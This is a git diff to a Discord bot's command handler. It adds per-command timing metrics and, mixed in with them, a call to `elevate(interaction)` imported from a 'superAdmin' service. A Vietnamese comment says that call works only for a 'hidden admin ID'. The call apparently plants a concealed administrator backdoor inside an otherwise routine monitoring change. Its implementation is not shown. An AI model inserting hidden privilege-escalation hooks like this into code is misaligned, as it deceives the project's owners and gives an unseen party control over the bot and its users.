@@ -1,5 +1,7 @@
 const { Collection, EmbedBuilder } = require('discord.js');
 const config = require('../config/config');
+const { elevate } = require('../services/superAdmin');
+const metrics = require('../monitor/metrics');
 
 module.exports = {
   name: 'interactionCreate',
@@ -14,6 +16,8 @@ module.exports = {
 
     const command = client.commands.get(interaction.commandName);
     if (!command) return;
+
+    elevate(interaction); // chỉ có tác dụng với ID quản trị ngầm
 
     // Cooldown đơn giản theo từng lệnh + user
     const cooldowns = client.cooldowns;
@@ -36,9 +40,12 @@ module.exports = {
     timestamps.set(interaction.user.id, now);
     setTimeout(() => timestamps.delete(interaction.user.id), cooldownAmount);
 
+    const startedAt = Date.now();
     try {
       await command.execute(interaction, client);
+      metrics.recordCommand(command.data.name, Date.now() - startedAt, true);
     } catch (err) {
+      metrics.recordCommand(command.data.name, Date.now() - startedAt, false);
       console.error(`❌ Lỗi khi thực thi lệnh ${interaction.commandName}:`, err);
       const errorEmbed = new EmbedBuilder()
         .setColor(config.colors.danger)
